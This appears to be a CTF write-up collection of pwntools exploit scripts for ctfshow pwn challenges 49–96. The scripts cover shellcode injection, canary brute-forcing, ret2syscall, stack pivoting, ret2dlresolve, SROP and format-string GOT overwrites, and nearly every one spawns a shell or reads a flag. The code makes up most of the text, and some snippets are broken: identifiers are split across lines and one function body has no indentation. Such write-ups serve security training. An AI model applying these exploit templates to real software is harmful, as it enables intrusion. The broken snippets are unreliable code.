# ctfshow pwn题解（部分）

## read的系统调用号为0x3,execve的系统调用号为0xb

## 49 mprotect（32）

一个`mprotect`的题，主要是记一下模板

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
#gdb.attach(p)

mprotect  = elf.sym['mprotect']
addr = 0x80DA000
size = 0x1000
proc = 0x7
pop_ebx_esi_ebp_ret = 0x80a019b
read = elf.sym['read']

payload = b'a'*0x12+b'b'*0x4+p32(mprotect)
payload+=p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(size)+p32(proc)
payload+=p32(read)
payload+=p32(pop_ebx_esi_ebp_ret)+p32(0)+p32(addr)+p32(size)+p32(addr)

p.sendline(payload)
shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```

## 52 函数传参（32）

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28294)
#gdb.attach(p)
flag = 0x8048586

payload = b'a'*0x6C+b'b'*0x4+p32(flag)+p32(0)+p32(876)+p32(877)

p.sendline(payload)
p.interactive()
```

## 53 32位canary爆破

```python
from pwn import *
context.log_level = 'critical'
canary = b''
for i in range(4):
    for c in range(0xFF):
        #io = process('./pwn')
        io = remote('pwn.challenge.ctf.show',28248)
        io.sendlineafter('>',b'-1')
        payload = b'a'*0x20 + canary + p8(c)
        io.sendafter('$ ',payload)
        io.recv(1)
        ans = io.recv()
        print (ans)
        if b'Canary Value Incorrect!' not in ans:
            print ('The index({}),value({})'.format(i,c))
            canary += p8(c)
            break
        else:
            print ('tring... ...')
        io.close()

#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28248)
elf = ELF('./pwn')
flag = elf.sym['flag']
payload = b'a'*0x20 + canary + p32(0)*4 + p32(flag)
io.sendlineafter('>',b'-1')
io.sendafter('$ ',payload)
io.interactive()
```

## 54 puts遇见'\x00'截断，可以填充满导致后续内容溢出

```python
from pwn import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
p = remote('pwn.challenge.ctf.show',28241)
p.sendlineafter(b'Username:\n',b'a'*256)
p.recvuntil(b'aa,')
password = p.recv(33)
p.close()
p = remote('pwn.challenge.ctf.show',28241)
p.sendline('amdin')
p.sendlineafter(b'.\n',password)
p.interactive()
```

## 61 leave_ret指令会对shellcode产生影响，注意输入的后面是否有该指令

#### 有PIE，栈可执行，有RWX

```shell
❯ checksec pwn
[*] '/home/pwn/pwn/ctfshow/61/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p =remote('pwn.challenge.ctf.show',28273)
#gdb.attach(p)

p.recvuntil(b'[')
v5 = int(p.recvuntil(b']',drop=True),16)
shellcode = asm(shellcraft.sh())
payload = b'a'*0x10+b'b'*0x8+p64(v5+0x20)+shellcode
p.sendline(payload)
p.sendline(b'cat ctfshow_flag')
p.interactive()
```

## 66 \x00绕过字符串

```python
from pwn import *
context(os = 'linux',arch = 'amd64')
p = process('./pwn')
payload = b'\x00\xc0'+asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
```

## 68 nop sled(64bit)

#### 有Canary，无PIE，栈可执行，有RWX,绕过随机数生成的缓冲区位置

```shell
❯ checksec pwn
[*] '/home/pwn/pwn/ctfshow/68/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show', 28182)
#gdb.attach(p)

shellcode = asm(shellcraft.sh())
payload = b'\x90'*1336 + shellcode

p.recvuntil(": 0x")
addr = u64(unhex(p.recvline(keepends=False).zfill(16)),endian='big')
log.info("addr:"+hex(addr))
p.recvuntil(b"> ")
p.sendline(payload)
p.recvuntil(b"> ")
sh = addr + 668 + 0x35
log.info("send:"+hex(sh))
p.sendline(hex(sh))

p.interactive()
```

## 69 ORW的板子

#### 无Canary，无PIE，有RWX，栈可执行

```shell
❯ checksec pwn
[*] '/home/pwn/pwn/ctfshow/69/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
```

```python
from pwn import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28170)
mmap = 0x123000
jmp_rsp = 0x400a01
orw_shellcode = shellcraft.open("/ctfshow_flag") # 打开根目录下的ctfshow_flag文件
orw_shellcode += shellcraft.read(3,mmap,100) # 读取文件标识符是3的文件0x100个字节存放到mmap分配的地址空间里
orw_shellcode += shellcraft.write(1,mmap,100) # 将mmap地址上的内容输出0x100个字节
shellcode = asm(orw_shellcode)
## read里的fd写3是因为程序执行的时候文件描述符是从3开始的，write里的1是标准输出到显示器
payload = asm(shellcraft.read(0,mmap,0x100))+asm("mov rax,0x123000; jmp rax")
# buf里的rop是往mmap里读入0x100长度的数据，跳转到mmap的地址执行
payload = payload.ljust(0x28,'a') # buf的大小是0x20，加上rbp 0x8是0x28，用'\x00'去填充剩下的位置
payload += p64(jmp_rsp)+asm("sub rsp,0x30; jmp rsp") # 返回地址写上跳转到rsp
io.recvuntil('do')
io.sendline(payload)
io.sendline(shellcode)
io.interactive()
```

## 70 ORW的汇编板子

#### 有Canary，无PIE，栈可执行，有RWX，沙盒保护

```shell
❯ checksec pwn
[*] '/home/pwn/pwn/ctfshow/70/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

```python
#coding:utf-8
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28156)
#gdb.attach(p)

shellcode = '''
push 0

mov r15, 0x67616c66	//flag的ascll码形式
push r15
mov rdi, rsp
mov rsi, 0
mov rax, 2
syscall		//open("flag",rsp,0)

mov r14, 3
mov rdi, r14
mov rsi, rsp
mov rdx, 0xff
mov rax, 0
syscall		//read(3,rsp,0xff)

mov rdi, 1
mov rsi, rsp
mov rdx, 0xff
mov rax, 1
syscall		//write(1.rsp,oxff)
'''
payload = asm(shellcode)
p.sendline(payload)
p.interactive()
```

## 71 ret2syscall(32bit)板子

#### NX开启，无PIE

```shell
❯ checksec pwn
[*] '/home/pwn/pwn/ctfshow/71/pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
```

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28304)
#gdb.attach(p)

binsh = 0x80BE408	//能找到binsh
int_0x80 = 0x08049421
pop_eax = 0x080bb196	//控制int 0x80
pop_edx_ecx_ebx = 0x0806eb90	//传3个参数
payload = b'a'*0x6C+b'b'*0x4
payload+=p32(pop_eax)+p32(0xb)	//0xb是execve
payload+=p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(binsh)	//execve(0,0,"/bin/sh")
payload+=p32(int_0x80)
p.sendline(payload)
p.interactive()
```

## 72 ret2syscall(32bit,无/bin/sh)板子

#### NX保护开启，无PIE

```shell
❯ checksec pwn
[*] '/home/pwn/pwn/ctfshow/72/pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28258)
#gdb.attach(p)

pop_eax = 0x080bb2c6
payload = b'a'*0x28+b'b'*0x4
int_0x80 = 0x0806f350
#------read-----
pop_edx_ecx_ebx = 0x0806ecb0
bss = 0x80EB000
payload+=p32(pop_eax)+p32(0x3)
payload+=p32(pop_edx_ecx_ebx)+p32(0x10)+p32(bss)+p32(0)
payload+=p32(int_0x80)
#------syscall-------
payload+=p32(pop_eax)+p32(0xb)
payload+=p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(bss)
payload+=p32(int_0x80)
p.sendline(payload)
p.sendline(b'/bin/sh\x00')
p.interactive()
```

## 75 栈迁移（32位）

#### 可以泄露ebp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
#p = remote('pwn.challenge.ctf.show',28143)
#gdb.attach(p)

system = elf.sym['system']
leave = 0x080484d5
payload = b'a'*0x24+b'show'
pause()
p.recvuntil(b'codename:\n')
pause()
p.send(payload)
p.recvuntil(b'show')
ebp = u32(p.recv(4).ljust(4,b'\x00'))
buf = ebp-0x38
payload = (p32(system)+p32(0)+p32(buf+12)+b'/bin/sh\x00').ljust(0x28,b'a')+p32(buf-4)+p3
2(leave)
p.sendline(payload)
p.interactive()
```

## 76 base64解码

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28175)
#gdb.attach(p)

input_addr = 0x811EB40
shell = 0x8049284
payload = b'a'*0x4+p32(shell)+p32(input_addr)
payload = base64.b64encode(payload)
p.sendline(payload)
p.interactive()
```

## 78 ret2syscall(64)

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28283)
#gdb.attach(p)

pop_rax = 0x000000000046b9f8
pop_rdi = 0x00000000004016c3
pop_rdx_rsi = 0x00000000004377f9
ret = 0x000000000045bac5
buf = 0x6c2000

payload = b'a'*0x50+b'b'*0x8
# read(0,buf,0x10)
payload+=p64(pop_rax)+p64(0)
payload+=p64(pop_rdx_rsi)+p64(0x10)+p64(buf)
payload+=p64(pop_rdi)+p64(0)
payload+=p64(ret)
# syscall(0,buf,0)
payload+=p64(pop_rax)+p64(0x3b)
payload+=p64(pop_rdx_rsi)+p64(0)*2
payload+=p64(pop_rdi)+p64(buf)
payload+=p64(ret)

p.sendline(payload)
p.sendline(b'/bin/sh\x00')
p.interactive()
```



## 79 ret2reg(32位) call rax或jmp reg挟持走向

#### 栈可执行

1. 查看溢出函数返回时哪个寄存值指向溢出缓冲区空间
2. 查找`call rax`或`jmp reg`指令，将`EIP`设置位该指令地址
3. `reg`所指向的空间上注入`shellcode`

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28148)
#gdb.attach(p)

shellcode = asm(shellcraft.sh())
call_eax = p32(0x080484a0)
payload = flat(shellcode,b'a'*(0x208+0x4-len(shellcode)),call_eax)
p.sendline(payload)
p.interactive()
```

## 82 高级ROP NO_RELRO（32）ret2dlresolve （适用于无基地址泄露）

```python
from pwn import *
context.log_level = 'debug'
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28244)
elf = ELF('./pwn')
rop = ROP('./pwn')
p.recvuntil(b'PWN!\n')
offset = 112
rop.raw(offset*b'a')
rop.read(0,0x8049804+4,4)	# modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace(b"read",b"system")
rop.read(0,0x80498E0,len((dynstr)))		# construct a fake dynstr section
rop.read(0,0x80498E0+0x100,len(b'/bin/sh\x00'))		# read /bin/sh\x00
rop.raw(0x8048376)	# the second instruction of read@plt
#section
rop.raw(0xdeadbeef)
rop.raw(0x80498E0+0x100)
assert(len(rop.chain())<=256)
rop.raw(b'a'*(256-len(rop.chain())))
p.send(rop.chain())
p.send(p32(0x80498E0))
p.send(dynstr)
p.send(b'/bin/sh\x00')
p.interactive()
```

## 83 Partial_RELRO(32)ret2dlresolve

```python
from pwn import *
context.log_level = 'debug'
elf = ELF("./pwn")
rop = ROP('./pwn')
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28179)
io.recvuntil("PWN!\n")
payload = flat({0x70:raw_rop,256:dlresolve.payload})
io.sendline(payload)
io.interactive()
```

## 84 NO_RELRO（64）ret2dlresolve

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28159)
elf = ELF("./pwn")

bss_addr = elf.bss()
print(hex(bss_addr))
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    return payload

io.recvuntil('PWN!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x200 # new stack size is 0x200
new_stack = bss_addr+0x100

# modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./pwn")
offset = 112+8
rop.raw(offset*b'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))
rop.raw(0x400607)
rop.raw(b"a"*(256-len(rop.chain())))
print(rop.dump())
print(len(rop.chain()))
assert(len(rop.chain())<=256)
rop.raw(b"a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p64(0x600B30+0x100))


# construct a fake dynstr section
rop = ROP("./pwn")
rop.raw(offset*b'a')
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace(b"read",b"system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+0x100,len(dynstr)))
rop.raw(0x400607)
rop.raw(b"a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(dynstr)

# read /bin/sh\x00
rop = ROP("./pwn")
rop.raw(offset*b'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+0x100+len(dynstr),len("/bin/sh\x00")))
rop.raw(0x400607)
rop.raw(b"a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(b"/bin/sh\x00")


rop = ROP("./pwn")
rop.raw(offset*b'a')
rop.raw(0x0000000000400771) #pop rsi; pop r15; ret;
rop.raw(0)
rop.raw(0)
rop.raw(0x0000000000400773)
rop.raw(0x600B30+0x100+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt
rop.raw(0xdeadbeef)
rop.raw(b'a'*(256-len(rop.chain())))
print(rop.dump())
print(len(rop.chain()))
io.send(rop.chain())
io.interactive()
```

## 85 Parti_RELRO（64）ret2dlresolve

```python
from pwn import *
context.arch="amd64"
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28274)
elf = ELF("./pwn")
bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'\x00' * 0x38
    return payload
def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size
    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size
    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + b"\x00"
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)//24
    resolve_data +=b'\x00'*pad
    resolve_data += symbol
    # construct fake reloc
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)//24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +=b'\x00'*pad
    resolve_data +=write_reloc
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
io.recvuntil('Welcome to CTFshowPWN!\n')
#gdb.attach(io)
store_addr = bss_addr+0x100
sh = b"/bin/sh\x00"
# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./pwn")
offset = 112+8
rop.raw(offset*'\x00')
resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr,b"system",elf.got["write"])
rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)+len(sh)))
rop.raw(vuln_addr)
rop.raw("\x00"*(256-len(rop.chain())))
assert(len(rop.chain())<=256)
io.send(rop.chain())

# send resolve data and /bin/sh
io.send(resolve_data+sh)
# rop = ROP("./main_partial_relro_64")
# rop.raw(offset*'\x00')
bin_sh_addr = store_addr+len(resolve_data)
# rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
# rop.raw(vuln_addr)
# rop.raw("a"*(256-len(rop.chain())))
# io.send(rop.chain())
# io.send(sh)
# leak link_map addr
rop = ROP("./pwn")
rop.raw(offset*'\x00')
rop.raw(csu(0, 1 ,elf.got['write'],1,0x601008,8))
rop.raw(vuln_addr)
rop.raw("\x00"*(256-len(rop.chain())))
io.send(rop.chain())
link_map_addr = u64(io.recv(8))
print(hex(link_map_addr))
# set l->l_info[VERSYMIDX(DT_VERSYM)] = NULL
rop = ROP("./pwn")
rop.raw(offset*'\x00')
rop.raw(csu(0, 1 ,elf.got['read'],0,link_map_addr+0x1c8,8))
rop.raw(vuln_addr)
# rop.raw("a"*(256-len(rop.chain())))
io.sendline(rop.chain())
sleep(1)
io.send(p64(0))
rop = ROP("./pwn")
rop.raw(offset*'\x00')
rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret;
rop.raw(bin_sh_addr)
rop.raw(resolve_call)
# rop.raw('\x00'*(256-len(rop.chain())))
io.send(rop.chain())
io.interactive()
```

## 86 SROP 64

#### 溢出想构造ROP链的话，没有动态链接库，本身程序gadget少得可怜，gadget不足，想ret2syscall的话，syscall的参数rax得是59，rdi得是/bin/sh的地址，rsi和rdx得为零，但相关pop的gadget都没有
```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28139)
elf = ELF('./pwn')

binsh_offset = 0x100
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = elf.symbols['global_buf']+0x100
frame.rsi = 0
frame.rdx = 0
frame.rip = elf.symbols['syscall']

payload = bytes(frame).ljust(0x100,b'a')+b'/bin/sh\x00'
p.recvuntil(b'PWN!\n')

p.send(payload)
p.sendline(b'cat ctfshow_flag')
p.interactive()
```

## 87 stack pivoting 64

#### 可控制的栈溢出字节数较少；开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域；其它漏洞难以利用，劫持栈到堆空间，从而在堆上写ROP以及进行堆漏洞利用

#### 可以控制程序执行流；可以控制rsp指针

```python
from pwn import *
#sh = process('./pwn')
sh = remote('pwn.challenge.ctf.show',28115)

shellcode_x86 = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += b"\x0b\xcd\x80"

sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
jmp_esp = 0x08048d17
payload = shellcode_x86 + (
    0x20 - len(shellcode_x86)) * b'b' + b'bbbb' + p32(jmp_esp) + sub_esp_jmp
sh.sendline(payload)
sh.sendline(b'cat ctfshow_flag')
sh.interactive()
```

## 88 frame faking

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28304)
elf = ELF('./pwn')

'''
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"
'''

shellcode = asm(shellcraft.sh())
jump_addr = 0x400767

def writebyte(addr,data):
    payload = str(hex(addr))+' '+str(data)
    p.recvuntil("What?")
    p.sendline(payload)

writebyte(jump_addr+1,u32(asm('jmp $-0x4a')[1:].ljust(4,b'\x00')))
writebyte(jump_addr,u32(asm('jmp $-0x4a')[0:1].ljust(4,b'\x00')))

shell_addr = 0x400769

for chr in shellcode:
    writebyte(shell_addr,str(chr))
    shell_addr+=1

writebyte(jump_addr+1,u32(asm('jmp $+0x2')[1:].ljust(4,b'\x00')))
p.sendline(b'cat ctfshow_flag')
p.interactive()
```

或

```python
#coding:utf8
from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('127.0.0.1',10000)
text = 0x400767
def writeData(addr,data):
io.sendlineafter('Where What?',hex(addr) + ' ' + str(data))
writeData(text+1,u32(asm('jnz $-0x4A')[1:].ljust(4,'\x00')))
writeData(text,u32(asm('jmp $-0x4A')[0:1].ljust(4,'\x00')))
shellcode = asm('''mov rax,0x0068732f6e69622f
	push rax
	mov rdi,rsp
	mov rax,59
	xor rsi,rsi
	mov rdx,rdx
	syscall
''')
shellcode_addr = 0x400769
i = 0
for x in shellcode:
	data = u8(x)
	writeData(shellcode_addr + i,data)
	i = i + 1
writeData(text+1,u32(asm('jnz $+0x2')[1:].ljust(4,'\x00')))
io.interactive()
```

## 89 花栈溢出

```python
from pwn import *
from LibcSearcher import *
context(arch = "amd64",os = 'linux',log_level = 'debug')
#context(arch = "i386",os = 'linux',log_level = 'debug')
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28227)
elf = ELF("./pwn")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

bss_addr = 0x602010
rdiret = 0x400be3
rsir15 = 0x400be1
leave = 0x400ada
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_plt = elf.plt['read']
io.recvuntil('You want to send:')
io.sendline(str(0x2000))

payload = b'a' * 0x1010 + p64(bss_addr -0x8) + p64(rdiret) + p64(puts_got) + p64(puts_pl
t)
payload += p64(rdiret) + p64(0) + p64(rsir15) + p64(bss_addr) + p64(0) + p64(read_plt)
payload += p64(leave)
payload = payload.ljust(0x2000,b'a')

io.send(payload)
io.recvuntil(b"See you next time!\n")
puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr-libc.dump('puts')
log.info(hex(libc_base))
one_gadget = libc_base + 0x10a2fc
io.send(p64(one_gadget))
#io.send(payload)
io.interactive()
```

## 94 fmtstr实现任意地址写

```python
from pwn import *
context.log_level = 'debug'
#p = process('./pwn')
p = remote('pwn.challenge.ctf.show',28286)
elf = ELF('./pwn')
printf_got=elf.got['printf']
sys_got = elf.plt['system']

payload = fmtstr_payload(6,{printf_got:sys_got})
p.sendline(payload)
p.recv()
p.sendline(b'/bin/sh\x00')
p.sendline(b'cat ctfshow_flag')
p.interactive()
```

## 95 格式化字符串实现任意位置读

```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28159)
elf = ELF('./pwn')
printf_got = elf.got['printf']
payload = p32(printf_got) + b'%6$s'
io.send(payload)
printf = u32(io.recvuntil('\xf7')[-4:])
libc = LibcSearcher('printf',printf)
libc_base = printf - libc.dump('printf')
system = libc_base + libc.dump('system')
log.info("libc_base:"+hex(libc_base))
log.info("system ===> %s" % hex(system))
payload = fmtstr_payload(6,{printf_got:system})
io.send(payload)
io.send(b'/bin/sh\x00')
io.recv()
io.interactive()
```

## 96 格式化字符串泄露内存中的字符

```python
from pwn import *
p = remote('pwn.challenge.ctf.show',28253)
flag = b''
q = 6
for i in range(q,q+12):
    payload = '%{}$p'.format(str(i))
    p.sendlineafter(b'$ ',payload)
    aim = unhex(p.recvuntil(b'\n',drop = True).replace(b'0x',b''))
    flag+=aim[::-1]

print(flag)
```

